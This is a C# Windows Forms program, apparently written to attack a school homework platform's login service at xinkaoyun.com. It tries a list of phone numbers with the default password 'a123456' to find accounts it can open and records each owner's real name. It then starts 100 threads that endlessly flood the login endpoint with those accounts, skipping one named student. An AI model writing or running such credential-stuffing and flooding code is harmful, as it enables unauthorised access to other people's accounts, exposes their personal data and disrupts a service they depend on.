using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
namespace HomeworkPicker
{
    public partial class Form1 : Form
    {
        private List<string> Phone = new List<string>();

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private Dictionary<string, string> PhoneNumberAndOwner=new Dictionary<string, string>();

        public NoHomework.Root_1 Login(string Users)
        {
            try
            {
                var tmp_Root = new NoHomework.Root_1();
                System.Net.WebClient WebClientObj = new System.Net.WebClient();

                System.Collections.Specialized.NameValueCollection PostVars = new System.Collections.Specialized.NameValueCollection();

                PostVars.Add("userPass", "a123456");

                PostVars.Add("userName", Users);

                PostVars.Add("platform", "android");


                WebClientObj.Encoding = Encoding.UTF8;

                string sRemoteInfo=string.Empty;

                WebClientObj.DownloadStringCompleted += (sender, e) =>
                {
                    //Console.WriteLine(sender.ToString());   //输出 System.Net.WebClient   触发事件的对象
                    //Console.WriteLine(e.Result);    //输出页面源代码
                    sRemoteInfo = e.Result;
                };
                //WebClientObj.UploadValuesAsync(new Uri("http://xxzy.xinkaoyun.com:8081/holidaywork/login"),PostVars);
                byte[] byRemoteInfo = WebClientObj.UploadValues("http://xxzy.xinkaoyun.com:8081/holidaywork/login", "POST", PostVars);


                //下面都没用啦，就上面一句话就可以了 

                sRemoteInfo = System.Text.Encoding.UTF8.GetString(byRemoteInfo);

                JsonSerializerSettings jsonSerializerSettings = new JsonSerializerSettings();

                jsonSerializerSettings.NullValueHandling = NullValueHandling.Ignore;

                tmp_Root = JsonConvert.DeserializeObject<NoHomework.Root_1>(sRemoteInfo,jsonSerializerSettings);

                return tmp_Root;
            }
            catch (Exception)
            {

                throw;
            }

        }
        int Count = 0;
        public void BoomLogin(string Users)
        {
            while (true)
            {
                try
                {
                    var tmp_Root = new NoHomework.Root_1();
                    System.Net.WebClient WebClientObj = new System.Net.WebClient();

                    System.Collections.Specialized.NameValueCollection PostVars = new System.Collections.Specialized.NameValueCollection();

                    PostVars.Add("userPass", "a123456");

                    PostVars.Add("userName", Users);

                    PostVars.Add("platform", "android");


                    WebClientObj.Encoding = Encoding.UTF8;

                    string sRemoteInfo = string.Empty;

                    WebClientObj.DownloadStringCompleted += (sender, e) =>
                    {
                        //Console.WriteLine(sender.ToString());   //输出 System.Net.WebClient   触发事件的对象
                        //Console.WriteLine(e.Result);    //输出页面源代码
                        sRemoteInfo = e.Result;
                        Count++;
                    };
                    WebClientObj.UploadValuesAsync(new Uri("http://xxzy.xinkaoyun.com:8081/holidaywork/login"), PostVars);
                    byte[] byRemoteInfo = WebClientObj.UploadValues("http://xxzy.xinkaoyun.com:8081/holidaywork/login", "POST", PostVars);


                    //下面都没用啦，就上面一句话就可以了 

                    //sRemoteInfo = System.Text.Encoding.UTF8.GetString(byRemoteInfo);

                    //JsonSerializerSettings jsonSerializerSettings = new JsonSerializerSettings();

                    //jsonSerializerSettings.NullValueHandling = NullValueHandling.Ignore;

                    //tmp_Root = JsonConvert.DeserializeObject<NoHomework.Root_1>(sRemoteInfo, jsonSerializerSettings);

                    Thread.Sleep(1);
                }
                catch (Exception)
                {

                    throw;
                }
            }


        }

        private void button1_Click(object sender, EventArgs e)
        {
            string str;

            StreamReader sr = new StreamReader(Application.StartupPath + "\\phone.txt", false);

            str = sr.ReadToEnd();

            sr.Close();

            string[] tmp = str.Split('\n');

            List<string> PhoneNumbers = new List<string>();
            foreach (var item in tmp)
            {
                if(item!="")PhoneNumbers.Add(item.Remove(item.Length - 1));
            }
            
            if (PhoneNumbers != null)
            {
                foreach (var item in PhoneNumbers)
                {


                    NoHomework.Root_1 root_1 = Login(item);

                    if (root_1.msg != "登录成功") continue;

                    PhoneNumberAndOwner.Add(item, root_1.data.realName);

                    Phone.Add(item);

                }
            }
            if (PhoneNumberAndOwner != null)
            {
                MessageBox.Show("GetSuccess");
            }
        }
        int CNT = 0,cnt2=0;

        private void Boom()
        {
            while (true)
            {

                foreach (var item in Phone)
                {
                    if (PhoneNumberAndOwner[item] != "李嘉俊")
                    {
                        NoHomework.Root_1 root = Login(item);
                        if (root.msg == "登录成功") cnt2++;
                        CNT++;
                    }
                }
                Thread.Sleep(1);
            }
        }
        private void FastBoom()
        {
            foreach (var item in Phone)
            {
                if(PhoneNumberAndOwner[item]!="李嘉俊")
                {
                    BoomLogin(item);
                }
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            timer1.Interval = 1000;
            timer1.Start();
            Thread[] thread = new Thread[100];
            for (int i = 0; i < 100; i++)
            {
                thread[i] = new Thread(FastBoom);
                thread[i].Start();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            StringBuilder stringBuilder = new StringBuilder("目前可用的账号：");
            if (PhoneNumberAndOwner.Count != 0)
            {
                foreach (var item in Phone)
                {
                    stringBuilder.Append($"{item}---{PhoneNumberAndOwner[item]}\n");
                }
                MessageBox.Show(stringBuilder.ToString());
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label1.Text = "已响应："+CNT.ToString();
            label2.Text = "回复成功：" + cnt2.ToString();
            label3.Text = "Fast：" + Count.ToString();
        }
    }
}
